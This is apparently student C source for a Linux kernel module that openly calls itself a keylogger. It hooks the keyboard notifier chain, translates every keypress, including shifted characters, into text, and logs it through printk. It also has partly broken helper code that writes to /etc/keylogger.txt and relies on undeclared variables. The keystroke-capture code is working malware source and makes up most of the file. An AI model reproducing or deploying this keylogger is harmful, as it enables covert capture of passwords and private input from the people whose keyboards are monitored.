#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include "VictorSwagHeaders.h"

#define DRIVER_DESC     "Keylogger"
#define fullFileName    "/etc/keylogger.txt"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pornstars");  // remember to change before you turn in
MODULE_DESCRIPTION("Linux device driver for absolutely nothing ;) ;)");
MODULE_VERSION("1.0");

struct semaphore sem;

void WriteToFile(void);
int setup_disk(void);
ssize_t write_vaddr_disk(void *, size_t);

static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* YesShift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int UnpressedKey = 0;

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
        if( param->value==42 || param->value==54 )
        {
            //acquire lock to modify the global variable UnpressedKey
            down(&sem);
            if(param->down)
                UnpressedKey = 1;
            else
                UnpressedKey = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if(param->down)
        {
            down(&sem);
            if(UnpressedKey == 0)
                printk(KERN_INFO "%s \n", NoShift[param->value]);
            else
                printk(KERN_INFO "%s \n", YesShift[param->value]);
            up(&sem);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};


static int __init init_keylogger(void)
{
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registering the keylogger with the keyboard notifier list\n");
    sema_init(&sem, 1);
    WriteToFile();
    return 0;
}

static void __exit cleanup_keylogger(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered the keylogger module \n");
}

module_init(init_keylogger);
module_exit(cleanup_keylogger);

void WriteToFile(){

   int err = 0;

    printk(KERN_INFO "File to Open: %s\n", fullFileName);
  filepath = fullFileName; // set for disk write code
  err = setup_disk();
  err = write_vaddr_disk("none", 4);
  cleanup_disk();
}

int setup_disk() {
   mm_segment_t fs;
   int err;

   fs = get_fs();
   set_fs(KERNEL_DS);

   if (dio && reopen) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_SYNC | O_DIRECT, 0444);
   } else if (dio) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_TRUNC | O_SYNC | O_DIRECT, 0444);
   }

   if(!dio || (f == ERR_PTR(-EINVAL))) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_TRUNC, 0444);
      dio = 0;
   }
   if (!f || IS_ERR(f)) {
      set_fs(fs);
      err = (f) ? PTR_ERR(f) : -EIO;
      f = NULL;
      return err;
   }

   set_fs(fs);
   return 0;
}

ssize_t write_vaddr_disk(void * v, size_t is) {
   mm_segment_t fs;

   ssize_t s;
   loff_t pos;

   fs = get_fs();
   set_fs(KERNEL_DS);

   pos = f->f_pos;
   s = vfs_write(f, v, is, &pos);
   if (s == is) {
      f->f_pos = pos;
   }
   set_fs(fs);
   if (s != is && dio) {
      disable_dio();
      f->f_pos = pos;
      return write_vaddr_disk(v, is);
   }
   return s;
}

void cleanup_disk() {
   mm_segment_t fs;

   fs = get_fs();
   set_fs(KERNEL_DS);
   if(f) filp_close(f, NULL);
   set_fs(fs);
}

static void disable_dio() {
   dio = 0;
   reopen = 1;
   cleanup_disk();
   setup_disk();
}